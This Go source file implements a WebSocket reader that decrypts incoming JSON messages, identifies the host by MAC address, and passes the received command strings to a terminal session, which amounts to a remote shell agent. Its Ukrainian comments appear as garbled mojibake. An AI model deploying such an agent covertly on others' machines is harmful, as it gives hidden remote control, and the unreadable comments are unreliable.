package management

import (
	"Anthophila/information"
	"Anthophila/logging"

	"context"
	"encoding/json"
	"strings"
	"sync"

	"github.com/gorilla/websocket"
)

// Reader - —Å—Ç—Ä—É–∫—Ç—É—Ä–∞, —è–∫–∞ –∑–∞–±–µ–∑–ø–µ—á—É—î –æ–±—Ä–æ–±–∫—É –æ—Ç—Ä–∏–º–∞–Ω–∏—Ö –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω—å —á–µ—Ä–µ–∑ WebSocket.
type Reader struct {
	Ctx           context.Context // –¥–ª—è –∑–∞–≤–µ—Ä—à–µ–Ω–Ω—è Reader
	Logger        *logging.LoggerService
	Encryptor     *CryptoManager    // –ú–µ–Ω–µ–¥–∂–µ—Ä —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è –¥–ª—è –∑–∞—Ö–∏—Å—Ç—É –¥–∞–Ω–∏—Ö
	Terminal      TerminalInterface // –Ü–Ω—Ç–µ—Ä—Ñ–µ–π—Å –¥–ª—è —Ä–æ–±–æ—Ç–∏ –∑ —Ç–µ—Ä–º—ñ–Ω–∞–ª–æ–º
	CurrentClient string            // –î–æ–¥–∞—î—Ç—å—Å—è, —â–æ–± –∑–±–µ—Ä—ñ–≥–∞—Ç–∏ –ø–æ—Ç–æ—á–Ω–æ–≥–æ –∫–ª—ñ—î–Ω—Ç–∞ –¥–ª—è –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ
	cancelOutput  chan struct{}     // –ö–∞–Ω–∞–ª –¥–ª—è –∑—É–ø–∏–Ω–∫–∏ —Å—Ç–∞—Ä–æ—ó –≥–æ—Ä—É—Ç–∏–Ω–∏
	mu            sync.Mutex        // –ú'—é—Ç–µ–∫—Å –¥–ª—è –ø–æ—Ç–æ–∫–æ–±–µ–∑–ø–µ—á–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø—É
	Sender        *Sender
}

// NewReader —Å—Ç–≤–æ—Ä—é—î –Ω–æ–≤–∏–π –µ–∫–∑–µ–º–ø–ª—è—Ä `Reader` –∑ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏
func NewReader(ctx context.Context, logger *logging.LoggerService, encryptor *CryptoManager, ws *websocket.Conn) *Reader {
	r := &Reader{
		Ctx:          ctx,
		Logger:       logger,
		Encryptor:    encryptor,
		cancelOutput: make(chan struct{}),
		Sender:       NewSender(ws, logger), // ‚Üê –ø—Ä–∞–≤–∏–ª—å–Ω–∞ –∑–º—ñ–Ω–Ω–∞ —Ç—É—Ç!,
	}
	r.initTerminal(ws)
	return r
}

// initTerminal –∑–∞–ø—É—Å–∫–∞—î –Ω–æ–≤–∏–π —Ç–µ—Ä–º—ñ–Ω–∞–ª —ñ –∑–∞–ø—É—Å–∫–∞—î –≥–æ—Ä—É—Ç–∏–Ω—É, —è–∫–∞ —á–∏—Ç–∞—î –≤–∏—Ö—ñ–¥ –∑ –Ω—å–æ–≥–æ
func (r *Reader) initTerminal(ws *websocket.Conn) {
	// –Ø–∫—â–æ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–π —Ç–µ—Ä–º—ñ–Ω–∞–ª —ñ—Å–Ω—É—î ‚Äî –∑—É–ø–∏–Ω—è—î–º–æ
	if r.Terminal != nil {
		r.Terminal.Stop()
	}

	// –Ü–Ω—ñ—Ü—ñ–∞–ª—ñ–∑–∞—Ü—ñ—è –Ω–æ–≤–æ–≥–æ TerminalHandler
	handler := NewTerminalHandler(r.Logger, ws, r.Encryptor, &r.CurrentClient, r.Sender)

	if err := handler.Start(); err != nil {
		r.Logger.LogError("Failed to start terminal: ", err.Error())
		return
	}

	// –ü—Ä–∏–∑–Ω–∞—á–∞—î–º–æ —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å–Ω–µ –ø–æ—Å–∏–ª–∞–Ω–Ω—è
	r.Terminal = handler
}

// ReadMessage —á–∏—Ç–∞—î –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –∑ WebSocket —ñ –ª–æ–≥–≥—É—î —ó—Ö
func (r *Reader) ReadMessage(ws *websocket.Conn) {
	for {
		//_, message, err := ws.ReadMessage()
		_, _, err := ws.ReadMessage()
		if err != nil {
			r.Logger.LogError("Error reading message: %v", err.Error())
		}
		//r.Logger.LogInfo("Received: ", string(message))
	}
}

// ReadMessageCommand —á–∏—Ç–∞—î –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –∑ –∫–æ–º–∞–Ω–¥–æ—é, –æ–±—Ä–æ–±–ª—è—î —ó—ó —Ç–∞ –Ω–∞–¥—Å–∏–ª–∞—î –≤—ñ–¥–ø–æ–≤—ñ–¥—å –∞–±–æ –ø–µ—Ä–µ–¥–∞—î –≤ —Ç–µ—Ä–º—ñ–Ω–∞–ª
func (r *Reader) ReadMessageCommand(wSocket *websocket.Conn) {
	for {
		select {
		case <-r.Ctx.Done(): //–∑–Ω–∏—â—É—î–º–æ –≥–æ—Ä—É—Ç–∏–Ω—É —è–∫—â–æ –≤ –Ω–∞—Å –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è Done() —Ç–æ –º–∏ –ø–æ–≤–µ—Ä—Ç–∞—î–º–æ  return –Ω—ñ—á–æ–≥–æ —Ç–∏–º —Å–∞–º–∏–º –∑–Ω–∏—â—É—î–º–æ –≥–æ—Ä—É—Ç–∏–Ω—É
			r.Sender.Close()
			if r.Terminal != nil {
				r.Terminal.Stop()
			}
			return

		default:
			_, message, err := wSocket.ReadMessage()
			if err != nil {
				r.Logger.LogError("Error reading message: ", err.Error())
				return
			}

			// 1. –†–æ–∑—à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è
			decrypted := r.Encryptor.DecryptText(string(message))
			// 2. –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞, —á–∏ –¥—ñ–π—Å–Ω–æ —â–æ—Å—å —Ä–æ–∑—à–∏—Ñ—Ä—É–≤–∞–ª–æ—Å—è
			if decrypted == "" {
				r.Logger.LogError("Failed to decrypt message", string(message))
				continue
			}

			// 3. –õ–æ–≥—É–≤–∞–Ω–Ω—è —Ä–æ–∑—à–∏—Ñ—Ä–æ–≤–∞–Ω–æ–≥–æ —Ç–µ–∫—Å—Ç—É
			var raw map[string]json.RawMessage
			if err := json.Unmarshal([]byte(decrypted), &raw); err != nil {
				r.Logger.LogError("JSON parsing failed", err.Error())
				return
			}

			// üîç –í–∏–∑–Ω–∞—á–∞—î–º–æ —Ñ–æ—Ä–º–∞—Ç:
			if _, ok := raw["clientInfo"]; ok {
				var reg Registration
				if err := json.Unmarshal([]byte(decrypted), &reg); err != nil {
					r.Logger.LogError("Failed to parse registration", err.Error())
					return
				}

				var info ClientInfo
				if err := json.Unmarshal([]byte(reg.ClientInfo), &info); err != nil {
					r.Logger.LogError("Failed to parse clientInfo", reg.ClientInfo)
					return
				}

				r.Logger.LogInfo(reg.Message, reg.Status)

			} else if _, ok := raw["sClient"]; ok {
				var cmd Message
				if err := json.Unmarshal([]byte(decrypted), &cmd); err != nil {
					r.Logger.LogError("Failed to unmarshal decrypted JSON:", decrypted)
					continue
				}

				r.mu.Lock()
				r.CurrentClient = cmd.SClient
				r.mu.Unlock()
				//fmt.Println("Received text Command: ", string(cmd.Message))

				if cmd.Message == "help" {
					msg := Message{
						SClient: information.NewInfo().GetMACAddress(),
						RClient: cmd.SClient,
						Message: EscapeTerminalMessage("terminal", cmd.Message),
					}

					jsonData, err := json.Marshal(msg)
					if err != nil {
						r.Logger.LogError("Error marshalling JSON:", err.Error())
						continue
					}
					encrypted := r.Encryptor.EncryptText(string(jsonData))

					r.Sender.Send([]byte(encrypted))

				} else {
					if strings.TrimSpace(cmd.Message) == "restart" || strings.TrimSpace(cmd.Message) == "exit_cli" {
						r.initTerminal(wSocket)
						//r.Logger.LogInfo("Terminal restart: ", "restart")
						continue
					}

					if r.Terminal != nil {
						r.Terminal.SendCommand(cmd.Message)
					} else {
						r.Logger.LogInfo("Terminal not initialized command ignored: ", cmd.Message)
					}
				}
			}
		}
	}
}
